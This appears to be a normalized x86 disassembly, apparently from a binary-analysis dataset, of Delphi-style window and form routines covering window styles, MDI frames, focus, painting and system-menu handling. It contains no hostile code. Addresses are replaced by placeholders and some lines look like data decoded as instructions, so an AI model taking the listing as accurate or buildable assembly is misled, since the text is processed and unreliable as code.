call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_44dd08
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_44b2bc
mov edx esi
mov eax edi
call sub_4506ac
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_44ddb7 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_436f94
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_436f94
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_44df19
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44b2cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43a170
push eax
call SendMessageA
mov eax ebx
call sub_44e878
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43a170
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_433374
push eax
mov eax ebx
call sub_4333b8
push eax
mov eax ebx
call sub_43a170
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_4067fc
mov [ ebx + 0x254 ] eax
push ebx
push sub_44ce64
call sub_41ab9c
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_443bbc
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43a170
push eax
call SetWindowPos
jmp r-xdata
sub_44e066
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44e191
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_4372f8
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_450584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e198
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_44e1a0
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_437564
push 0x0
mov eax ebx
call sub_43a170
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_44e1e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_437ce8
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43a170
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43a170
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_44e248
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e2f0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e2f7
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax edi
call sub_44a5dc
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4032ec
mov eax ebx
call sub_44e600
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4032ec
test al al
jne r-xdata
sub_44e300
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_436c4c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_436c4c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_44e248
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_44e348
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_44e248
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44e36c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4139fc
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_4138dc
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4139fc
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_4138dc
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_44e5dc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43a170
mov dx 0xb000
call sub_44a39c
test al al
jne r-xdata
call sub_43a170
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44a39c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e5e3
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403910
jmp r-xdata
call sub_403910
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_436c4c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43a170
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44a39c
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_434b3c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
call sub_403910
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43a170
mov dx 0xb01a
call sub_44a39c
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403910
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_434b3c
sub_44e600
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_434b3c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43a170
push eax
call SetFocus
mov eax ebx
call sub_43a170
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_44e650
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_434b3c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44e704
mov eax esi
call sub_44e600
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43a598
mov edx eax
mov eax esi
call sub_44e248
sub_44e6b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44d2cc
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_434b3c
mov eax ebx
call sub_44d2cc
mov edx esi
call sub_44e6b4
sub_44e704
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4476e8
mov edx esi
call sub_4476cc
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44e7ac
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43a170
push eax
call SendMessageA
sub_44e7f8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_44e7ac
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_44e828
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_44e7ac
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_44e894
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d778
xor eax eax
push ebp
push sub_44e942
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41db5c
xor eax eax
push ebp
push sub_44e91f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4032ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e926
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41db5c
retn
sub_44e950
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_44d2cc
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_44d300
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4032ec
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_439438
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_44d34c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4032ec
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_44e9f0
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a170
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43a170
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_44e878
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43a170
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_438300
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_44ea6e
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41d358
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_44ead0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43a170
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4385c4
pop edi
pop esi
retn
sub_44eb1c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a170
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_44ec18
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_44d640
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_44eb1c
pop ecx
sub_44ec4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_435058
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43a170
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43a170
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43a170
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_434030
pop esi
pop ebx
retn
sub_44ecdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43a170
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_4393c4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43a170
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_447108
sub_44ed3c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_438460
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_446b1c
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_44ed88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44737c
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44edc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_44ee5b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee62
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_446a7c
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_453b7c
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_430ad4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_453b7c
jmp r-xdata
sub_44ee88
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4032ec
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_44eec8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c664
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_44eef4
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_44e6b4
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_4308ac
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_44ef4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4392a8
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_452530
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4032ec
sub_44efd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43a170
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43a170
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
